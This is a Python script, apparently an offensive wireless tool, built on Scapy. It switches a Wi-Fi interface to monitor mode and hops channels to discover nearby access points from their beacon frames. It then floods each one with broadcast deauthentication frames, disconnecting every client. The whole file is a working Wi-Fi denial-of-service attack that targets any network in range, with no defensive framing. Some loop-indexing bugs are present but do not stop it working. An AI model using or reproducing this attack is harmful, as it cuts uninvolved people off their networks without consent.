from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, sendp, conf, Dot11Beacon, Dot11ProbeResp, Dot11Elt
from scapy.all import send, sniff, RandMAC, get_if_hwaddr
from scapy.all import *
import os
from multiprocessing import Process
import random
import time


class deauth:

    def __init__(self, valueObj):
        self.valueObj = valueObj
        self.found_APs = []


    def attack(self):


        client = "FF:FF:FF:FF:FF:FF"
        for i in range(0, len(self.found_APs)-1):
            print("Now deauthing all users from " +  self.found_APs[1])
            ap = self.found_APs[i]
            # deauth packet for AP

            packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()

            #interface must be the monitor one
            sendp(packet, iface=self.valueObj.interfaceName, count=self.valueObj.count, inter=0.1 ,verbose=1)


		
    def channel_hopper(self):
        while True:
            try:
                channel = random.randrange(1,13)
                os.system("iwconfig {} channel {}".format(self.valueObj.interfaceName, channel))
                time.sleep(1)
            except KeyboardInterrupt:
                break



    def packet_handler(self, packet):
        try:
            if (packet.haslayer(Dot11)):
 
                if (packet.type == 0 and packet.subtype == 8):
                    if (packet.addr2 not in self.found_APs):
                        self.found_APs.append(packet.addr2)
                        print("Access point MAC: " + str(packet.addr2) + " with SSID " + str(packet.info) + " on channel " + str(int(ord(packet[Dot11Elt:3].info))))
                        
        except:
            raise
        


    def findAP(self):
        channel_hop = Process(target = self.channel_hopper)
        channel_hop.start()
        os.system("ifconfig " + self.valueObj.interfaceName + " down")
        os.system("iwconfig " + self.valueObj.interfaceName + " mode monitor")
        os.system("ifconfig " + self.valueObj.interfaceName + " up")

        print("Wait 15 seconds whilst discovering APs")
        result = sniff(iface=self.valueObj.interfaceName, prn=self.packet_handler, store=0, timeout=15)
        print("The MAC addresses for the found APs: ")
        print(self.found_APs)
    


    